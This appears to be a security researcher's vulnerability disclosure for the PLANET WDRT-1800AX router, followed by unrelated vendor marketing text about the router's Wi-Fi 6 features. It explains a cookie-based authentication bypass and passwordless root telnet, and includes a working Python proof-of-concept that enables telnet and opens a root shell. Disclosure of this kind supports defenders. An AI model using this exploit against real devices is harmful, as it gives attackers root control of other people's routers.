# Planet Technologies WDRT-1800AX Authentication Bypass Vulnerability .

Affected Device: `WDRT-1800AX`

Affected Firmware: `v1.01-CP21`

Description:

```
The PLANET technologies 1800AX router runs a web service vulnerable to trivial authentication bypass.
The bypass can be combined with a telnet weakness leading to a root shell on the device.
The router runs a minimal lighttpd binary to support a collection of JavaScript and html files which create requests to a 'cdata.cgi' binary.
This 32bit MIPS compiled binary supports the core functionality of the web service however uses a standard cookie to determine authenticated status.

```

---

## Details

The WDRT-1800AX router from PLANET technologies uses a pre-set, boolean cookie for determining authentication to the web management pages. The cookie 'LoginStatus' is created when a user attempts to login to the login form hosted by a CGI binary running via Lighttpd.

[![login](/0xfml/poc/raw/main/PLANET/login.png)](/0xfml/poc/blob/main/PLANET/login.png)

By simply replacing `false` to `true`, a user can bypass the need to supply the password to the web form, and instead access all administration functions of the device, including but not limited to; password resets, configuration downloads and enabling telnet.

Due to the router in its default configuration not having a password for the root user, when a user attempts to login to the telnet service as root, it simply supplies a session.

[![telnet](/0xfml/poc/raw/main/PLANET/telnet.png)](/0xfml/poc/blob/main/PLANET/telnet.png)

With a basic proof of concept, any lan-adjacent attacker can gain root access to the device without needing the appropriate passwords to the service(s). An example can be found below to enable the telnet service and interact with it.

```
import requests, telnetlib, sys
host = sys.argv[1]
url = 'http://'+host+'/cgi-bin/cdata.cgi'

cookies = {'LoginStatus':'true'}

headers = {
   'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
   'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
}
# doesnt check if its already enabled, just tries to enable it.
data = {
   'operation': 'DevManagement',
   'opt': 'telnet',
   'telnet': '1',
}

user = "root"
print("enabling telnet")

req = requests.post(url, headers=headers,data=data)

if req.text != '{ "err": 0 }':
   print("failed")

tn = telnetlib.Telnet(host, 23)
if (tn):
   print("connecting to session")
   tn.read_until(b"login: ")
   tn.write(user.encode('ascii') + b"\n")
   tn.interact()
```

### Extra notes

When I was first looking into the web app running in QEMU, I figured that the option to change the language to English was broken since the management option was set but not rendering. This was until I realised that the English language JavaScript file wasn't ever being included in the pre-set html pages, renaming the `lang_en.js` to `lang_zh.js` and clearing browser cache allowed the page to render without having to translate everything manually. :)

**Amazing Next-generation Wireless High-speed Connection**

PLANET WDRT-1800AX Dual Band 802.11ax 1800Mbps Wireless Gigabit Router, supporting MU-MIMO, Wave 2.0, OFDMA and EasyMesh technology, provides a maximum wireless speed of 1200Mbps in the 5GHz band and 600Mbps in the 2.4GHz band. The maximum number of client users is up to 64, ensuring more secure and robust connectivity with the adoption of Wi-Fi 6 technology.

![](/storage/products/49446/edm_WDRT-1800AX.jpg)

The WDRT-1800AX, suitable for home multi-device streaming connection, smart home and other environments, provides better speed and multi-installation connectivity for high-efficiency networking. Equipped with the next-generation Wi-Fi 6 (802.11ax) wireless network standard, the total bandwidth reaches 1800Mbps, and the 4-stream transmission technology improves the transmission efficiency of multiple devices, making AR/VR/IoT applications smoother.

**Benefits of Wi-Fi 6 technology**

As OFDMA, a multi-user version of OFDM, enables the concurrent AP to communicate (uplink and downlink) with multiple clients by assigning subsets of subcarriers called resource units (RUs) to the individual clients. With EasyMesh and Seamless Roaming technologies, it provides a better Wi-Fi user experience, reducing the likelihood of users turning off Wi-Fi and putting more load on the cellular network. These technologies also can solve Wi-Fi congestion issues in open workspaces and conference rooms. The WDRT-1800AX can offer more powerful throughput coverage of up to 64 client users.

![](/storage/products/49446/WDRT-1800AX-72.png)

* **OFDMA (Orthogonal Frequency Division Multiple Access)**OFDMA is a multi-user evolved version based on OFDM digital modulation technology. In the Wi-Fi 6 (802.11ax) standard, the main function of OFDMA is to improve network performance. Orthogonal frequency division multiple access (OFDMA) enables users to simultaneously operate in the same channel and therefore improves efficiency, latency, and throughput.

![](/storage/products/49446/WDAP-C1800AX-1.png)

* **Beamforming**Beamforming is to improve your Wi-Fi signal when you are far away from your router. When you use beamforming, Wi-Fi beamforming narrows the focus of that router signal, sending it directly to your devices in a straight line, thus minimizing surrounding signal interference and increasing the strength of the signal that ultimately bring you the following benefits:
  + Extend your Wi-Fi coverage
  + Deliver a more stable Wi-Fi connection
  + Deliver better Wi-Fi throughput
  + Reduce router interference

![](/storage/products/49446/WDRT-1800AX-1.png)

* **BSS (Basic Service Set) Coloring**
  The BSS color is a numerical identifier of the BSS. 802.11ax radios are able to differentiate between BSSs using BSS color identifier when other radios transmit on the same channel. If the color is the same, this is considered to be an intra-BSS frame transmission. In other words, the transmitting radio belongs to the same BSS as the receiver. If the detected frame has a different BSS color from its own, then the STA considers that frame as an inter-BSS frame from an overlapping BSS.

**Easy Installation with EasyMesh Function**

Wi-Fi EasyMesh provides a standards-based method for implementing multi-access point (AP) Wi-Fi networks. It not only has the advantages of easy-to-use and self-adjusting Wi-Fi, but also has interactive Wi-Fi CERTIFIED ™ equipment that leads to the advantage of improved equipment selection flexibility. The Wi-Fi EasyMesh network uses multiple access points that operate together to form a unified network, providing a smart and efficient Wi-Fi that fully covers indoor and outdoor spaces.

**WPA3 Next Generation Security for Your WLAN Solution**

WPA3 is the next generation Wi-Fi security technology that provides the most advanced security protocol to the market. WPA3 makes your connection more secure by preventing hackers from easily cracking your password no matter how simplified the password is. WPA3 can also provide more reliable password-based authentication, so it can better protect the security of individual users.

\* WDRT-1800AX only supports WPA3-Personal.

**Super Power Dual band WLAN Solution**

PLANET WDRT-1800AX, adopting the IEEE 802.11ax Wi-Fi 6 standard, provides a high-speed transmission. The maximum wireless speed in 2.4GHz band is up to 11AXG\_GHE40 of 574Mbps, and in the 5GHz band is up to 11AXA\_AHE80 of 1201Mbps. Both the 2.4GHz and 5GHz wireless connections can also be used simultaneously. Furthermore, the WDRT-1800AX adopts the high-class MediaTek SoC (System-on-a-Chip), which provides higher stability to meet the stringent requirements of the solution.

![](/storage/products/49446/WDRT-1800AX-5.png)

**Extreme High Speed and Wi-Fi 6 Technology Make Wireless Transmission More Powerful**

The WDRT-1800AX delivers the dual band and more bandwidth to avoid signal interference and ensure the best Wi-Fi performance. It allows you to check e-mails and surf the Internet via the 2.4GHz band and simultaneously watch full high-definition (HD) video or any other multimedia application via one 5GHz band. Besides, many client users can be connected to Wi-Fi at the same time. The maximum number of client users is up to 64. Moreover, the Gigabit Ethernet port of the WDRT-1800AX offers ultra-fast wired connections that utilize the maximum wireless bandwidth; therefore, users will experience a fast wireless speed of over 650Mbps. With the outstanding stability of high-speed wireless transmission, the WDRT-1800AX can provide users with excellent experience in multimedia streaming with your mobile devices anywhere, anytime.

**Mesh Wi-Fi and Seamless Roaming for Better Coverage**

Moving between a traditional Wi-Fi AP or router and range extender, your Wi-Fi signal can experience lag or a dropped connection. Mesh Wi-Fi comes with four features, including Seamless Roaming, Band Steering, Self-Healing, and Client Steering. A set of packages usually includes three to four APs. Each AP is an independent router. When the main AP functions, other APs are used as satellite APs. The whole system can provide Wi-Fi network connection with zero dead angle, meaning a large area is covered.

Its characteristic is not like the traditional star-shaped or tree-shaped network structure which can only communicate with the upper and lower access points, but each access point can connect and communicate with each other, and at the same time, it can automatically find the best path for transmitting packets. This enables your networking environment to get full coverage and efficient performance.

![](/storage/products/49446/WDRT-1800AX-2.png)
